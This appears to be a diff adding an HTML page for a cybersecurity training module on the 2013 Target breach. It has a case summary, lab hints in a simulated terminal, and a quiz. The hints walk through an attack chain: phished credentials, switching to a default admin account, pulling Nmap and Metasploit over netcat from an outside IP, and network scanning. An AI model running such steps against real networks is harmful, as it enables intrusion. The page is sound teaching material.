@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Module 2: Target</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
+    <link rel="stylesheet" href="/src/Modules/stylesheets/module2.css">
+    <link rel="stylesheet" href="/src/Modules/stylesheets/questions.css">
+    <link rel="stylesheet" href="/node_modules/xterm/css/xterm.css">
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    <script type="application/javascript" src="/node_modules/xterm/lib/xterm.js"></script>
+    <script type="application/javascript" src="/src/Modules/js/validate.js"></script>
+    
+    <!-- Terminal addon for resize -->
+    <script type="application/javascript" src="/src/Modules/js/fit-addon.js"></script>
+
+    <!-- This NEEDS to be added to each page which you dont want to user to see unless signed in -->
+    <script type="application/javascript" src="/src/authentication/js/userAuthenticationCheck.js"></script>
+    
+</head>
+</body>
+<div id="animated-background"></div>
+    <div class="container">
+        <div class="topContainer">
+            <!-- Description -->
+            <div class="resizableContainer" id="narrativeContainer">
+                <div class="containerContent">
+                  <h2 id="moduleTitle">Module 2: Target</h2>
+                  <div style="background-color: #444; padding: 10px; border-radius: 4px; border: 2px solid #ddd;">
+                    <div id="moduleSections">
+                        <div class="moduleSection">
+                            <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
+                                Introductory Module Video:</a>
+                            </div>
+                            <!-- YouTube Video Embed // Replace Video ID "https://www.youtube.com/watch?v=ID" -->
+                            <div class="videoWrapper" style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; background: #000;">
+                                <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"
+                                        src="https://www.youtube.com/embed/"
+                                        frameborder="0"
+                                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
+                                        allowfullscreen>
+                                </iframe>
+                            </div>
+                            <div class="spacer" style="height: 1em;"></div>
+                            <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
+                                Target Overview:
+                            </div>
+                            </div>
+                            <div class="moduleSection">
+                                <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
+                                    In 2013, during the peak holiday shopping season, Target, one of the largest retail chains in the United States, fell victim to a massive cyber attack. Hackers gained unauthorized access to Target's internal systems, compromising detailed information for approximately 40 million credit and debit card accounts and personal data for about 70 million customers. Despite Target's substantial investment in cybersecurity, including sophisticated malware detection software and a large security team, the breach occurred due to a phishing attack on a third-party vendor, Fazio Mechanical. The hackers exploited this breach to steal login credentials for Target's system and deploy malware, resulting in catastrophic financial losses and significant damage to Target's reputation.
+                                </div>
+                            </div>
+                            <div class="spacer" style="height: 1em;"></div>
+                            <div style="font-size: 18px; font-weight: normal; color: rgb(255, 215, 0); font-style: normal; text-decoration: underline;">
+                                Vulnerability Details:
+                            </div>
+                            <div class="moduleSection">
+                                <div style="font-size: 16px; font-weight: normal; color: white; font-style: normal; font-style: normal;">
+                                    The vulnerability exploited in the Target breach stemmed from a phishing attack on a third-party vendor, Fazio Mechanical. An employee of Fazio fell for a fraudulent email containing a malicious attachment, which enabled the hackers to deploy the Citadel Trojan horse—a variant of the well-known ZeuS malware. Despite Target's security measures, including the use of sophisticated malware detection software, the malware remained undetected on Fazio's systems. Subsequently, the hackers obtained login credentials for Target's network and deployed additional malware, which went unnoticed even after multiple alerts were issued by the malware detection system. This failure to respond to security alerts and disable automated malware deletion features allowed the hackers to exfiltrate sensitive data over a two-week period, leading to substantial financial losses and reputational damage for Target.
+                                </div>
+                            </div>
+                            <div class="spacer" style="height: 1em;"></div>
+                        <button class="returnButton"><a href="/src/home/html/index.html">Return to Main Page</a></button>                            
+                    </div>
+                  </div>
+                </div>
+              </div>
+<!-- Terminal -->
+<div class="resizableContainer" id="terminalContainer">
+    <h2>Remote Terminal</h2>
+    <div id="terminalDescription" style="font-size: 16px; font-weight: normal; color: white;">Welcome to the aftermath investigation of a cyber attack on a prominent retail chain. Assume the role of a cybersecurity analyst tasked with investigating the breach and identifying the vulnerabilities exploited by the attackers.
+
+In this scenario, assume that you already know the credentials of the user that was affected by the phishing attack. The credentials are as follows:
+<ul>
+<li>Username: faziodavid
+<li>Password: 1aB3cD7e
+</ul>
+Follow these hints:
+<ul>
+<li>Use the <code style="color: rgb(255, 215, 0);">help-module2</code> command to explore available commands.</li>
+<li>Begin by logging into the Ariba website using the obtained credentials: <code style="color: rgb(255, 215, 0);">ssh 192.168.1.47</code>.</li>
+<li>Escalate privileges by switching to the default user on the BMC server: <code style="color: rgb(255, 215, 0);">su - bmcadmin</code>.</li>
+<li>Download essential hacking tools, such as Nmap and Metasploit, using raw netcat commands:
+<ul>
+<li><code style="color: rgb(255, 215, 0);">nc 74.233.19.204 12345 > nmap.tar.gz</code></li>
+<li><code style="color: rgb(255, 215, 0);">nc 74.233.19.204 12345 > metasploit.tar.gz</code></li>
+</ul><li>Unzip and install the downloaded tools in your current directory:
+<ul>
+<li><code style="color: rgb(255, 215, 0);">tar -xzf nmap.tar.gz</code></li>
+<li><code style="color: rgb(255, 215, 0);">tar -xzf metasploit.tar.gz</code></li>
+</ul><li>Initiate internal reconnaissance by running Nmap to scan the network: <code style="color: rgb(255, 215, 0);">nmap 192.168.1.47</code>.</li>
+<li>Conduct a more in-depth scan of specific network services to identify vulnerabilities: <code style="color: rgb(255, 215, 0);">nmap -sV -p 135 192.168.1.47</code>.</li>
+</ul>Learn more about cybersecurity investigation techniques and tools:
+<ul>
+<li><a href="https://www.sans.org/cyber-security-skills-roadmap" style="color: rgb(255, 215, 0);">Cyber Security Skills Roadmap</a></li>
+<li><a href="https://www.forensicscolleges.com/blog/resources/what-is-digital-forensics/" style="color: rgb(255, 215, 0);">Digital Forensics Overview</a></li>
+<li><a href="https://www.nist.gov/" style="color: rgb(255, 215, 0);">NIST Cybersecurity Framework</a></li></ul></div>
+    <div id="terminal"></div>                
+</div>
+            <!-- Questions -->
+            <div class="resizableContainer" id="questionFormContainer">
+                <form class="containerContent" id="questionForm">
+                    <h2>Module Questions</h2>
+                    <div id="questionsContainer">
+                        <div>
+                            <label class="prompt">How was initial access into Target systems gained by the attackers?</label>
+                            <div>
+                                <input type="radio" id="Q1a" name="singleChoiceAnswer1" value="Phishing email to Target contractor" style="display: none;">
+                                <label class="radio-label" for="Q1a">Phishing email to Target contractor</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q1b" name="singleChoiceAnswer1" value="Exploiting a vulnerability in Target's website" style="display: none;">
+                                <label class="radio-label" for="Q1b">Exploiting a vulnerability in Target's website</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q1c" name="singleChoiceAnswer1" value="Physical access to Target's data centers" style="display: none;">
+                                <label class="radio-label" for="Q1c">Physical access to Target's data centers</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q1d" name="singleChoiceAnswer1" value="Compromising a third-party vendor with access to Target's network" style="display: none;">
+                                <label class="radio-label" for="Q1d">Compromising a third-party vendor with access to Target's network</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">How did the attackers escalate their privileges once inside Target networks?</label>
+                            <div>
+                                <input type="radio" id="Q2a" name="singleChoiceAnswer2" value="Exploited a zero-day vulnerability in Target's firewall" style="display: none;">
+                                <label class="radio-label" for="Q2a">Exploited a zero-day vulnerability in Target's firewall</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q2b" name="singleChoiceAnswer2" value="Used a brute-force attack to guess login credentials" style="display: none;">
+                                <label class="radio-label" for="Q2b">Used a brute-force attack to guess login credentials</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q2c" name="singleChoiceAnswer2" value="Manipulated Target's network configurations to gain higher privileges" style="display: none;">
+                                <label class="radio-label" for="Q2c">Manipulated Target's network configurations to gain higher privileges</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q2d" name="singleChoiceAnswer2" value="Took advantage of default username/password combinations on an administrative server" style="display: none;">
+                                <label class="radio-label" for="Q2d">Took advantage of default username/password combinations on an administrative server</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">What is a C2 server?</label>
+                            <div>
+                                <input type="radio" id="Q3a" name="singleChoiceAnswer3" value="Command and control server, used by attackers to maintain communication with and exfiltrate data from compromised systems within a target network" style="display: none;">
+                                <label class="radio-label" for="Q3a">Command and control server, used by attackers to maintain communication with and exfiltrate data from compromised systems within a target network</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q3b" name="singleChoiceAnswer3" value="A server used for hosting Target's public website" style="display: none;">
+                                <label class="radio-label" for="Q3b">A server used for hosting Target's public website</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q3c" name="singleChoiceAnswer3" value="A server used for storing customer data" style="display: none;">
+                                <label class="radio-label" for="Q3c">A server used for storing customer data</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q3d" name="singleChoiceAnswer3" value="A server used for internal communication within Target's IT department" style="display: none;">
+                                <label class="radio-label" for="Q3d">A server used for internal communication within Target's IT department</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">What is NetCat?</label>
+                            <div>
+                                <input type="radio" id="Q4a" name="singleChoiceAnswer4" value="Netcat is a networking utility for reading and writing to network connections using TCP or UDP" style="display: none;">
+                                <label class="radio-label" for="Q4a">Netcat is a networking utility for reading and writing to network connections using TCP or UDP</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q4b" name="singleChoiceAnswer4" value="Netcat is a type of malware used by hackers to infect systems" style="display: none;">
+                                <label class="radio-label" for="Q4b">Netcat is a type of malware used by hackers to infect systems</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q4c" name="singleChoiceAnswer4" value="Netcat is a programming language commonly used for web development" style="display: none;">
+                                <label class="radio-label" for="Q4c">Netcat is a programming language commonly used for web development</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q4d" name="singleChoiceAnswer4" value="Netcat is an antivirus software developed by Target" style="display: none;">
+                                <label class="radio-label" for="Q4d">Netcat is an antivirus software developed by Target</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">How was Netcat utilized in the Target hack?</label>
+                            <div>
+                                <input type="radio" id="Q5a" name="singleChoiceAnswer5" value="Netcat was utilized to download additional hacking tools, mainly to conduct reconnaissance within the network" style="display: none;">
+                                <label class="radio-label" for="Q5a">Netcat was utilized to download additional hacking tools, mainly to conduct reconnaissance within the network</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q5b" name="singleChoiceAnswer5" value="Netcat was used to directly access Target's customer database" style="display: none;">
+                                <label class="radio-label" for="Q5b">Netcat was used to directly access Target's customer database</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q5c" name="singleChoiceAnswer5" value="Netcat was used to shut down Target's servers" style="display: none;">
+                                <label class="radio-label" for="Q5c">Netcat was used to shut down Target's servers</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q5d" name="singleChoiceAnswer5" value="Netcat was used to encrypt Target's data" style="display: none;">
+                                <label class="radio-label" for="Q5d">Netcat was used to encrypt Target's data</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">What are some actions that could’ve been taken to prevent the initial infection?</label>
+                            <div>
+                                <input type="radio" id="Q6a" name="singleChoiceAnswer6" value="Train employees to recognize phishing emails and the next steps they should take if they believe they have received a phishing email" style="display: none;">
+                                <label class="radio-label" for="Q6a">Train employees to recognize phishing emails and the next steps they should take if they believe they have received a phishing email</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q6b" name="singleChoiceAnswer6" value="Install more antivirus software on Target's servers" style="display: none;">
+                                <label class="radio-label" for="Q6b">Install more antivirus software on Target's servers</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q6c" name="singleChoiceAnswer6" value="Block all incoming emails to prevent phishing attempts" style="display: none;">
+                                <label class="radio-label" for="Q6c">Block all incoming emails to prevent phishing attempts</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q6d" name="singleChoiceAnswer6" value="Ignore security updates on Target's systems" style="display: none;">
+                                <label class="radio-label" for="Q6d">Ignore security updates on Target's systems</label>
+                            </div>
+                        </div>
+                        <div>
+                            <label class="prompt">What is the hidden flag after exploiting the vulnerable machine?</label>
+                            <div>
+                                <input type="radio" id="Q7a" name="singleChoiceAnswer6" value="35FW5x" style="display: none;">
+                                <label class="radio-label" for="Q7a">GDxHwD</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7b" name="singleChoiceAnswer6" value="208cE7" style="display: none;">
+                                <label class="radio-label" for="Q7b">HivRzt</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7c" name="singleChoiceAnswer6" value="0T801j" style="display: none;">
+                                <label class="radio-label" for="Q7c">hXSYNU</label>
+                            </div>
+                            <div>
+                                <input type="radio" id="Q7d" name="singleChoiceAnswer6" value="u46U0o" style="display: none;">
+                                <label class="radio-label" for="Q7d">rECkLs</label>
+                            </div>
+                        </div>
+                    </div>
+                    <button class="submitQuestionsButton" id="module2" type="button" onclick="checkAnswers(this)">Check Answers</button>
+                    <div id="resultMessage"></div>
+                </form>
+            </div>                       
+        </div>
+    </div>
+    </div>
+        <!-- Animated background element -->
+        <script type="application/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r134/three.min.js"></script>
+        <script type="application/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/p5.js/1.1.9/p5.min.js"></script>
+        <script type="application/javascript" src="https://cdn.jsdelivr.net/npm/vanta@latest/dist/vanta.topology.min.js"></script>
+        <script>
+                // Animated Background
+                VANTA.TOPOLOGY({
+                    el: "#animated-background",
+                    color: 0x888888,
+                    backgroundColor: 0x222222
+                })
+        </script>
+
+    <!-- Confetti -->
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js"></script>
+    <script src="/src/Modules/js/module2.js"></script>
+</body>
+</html>
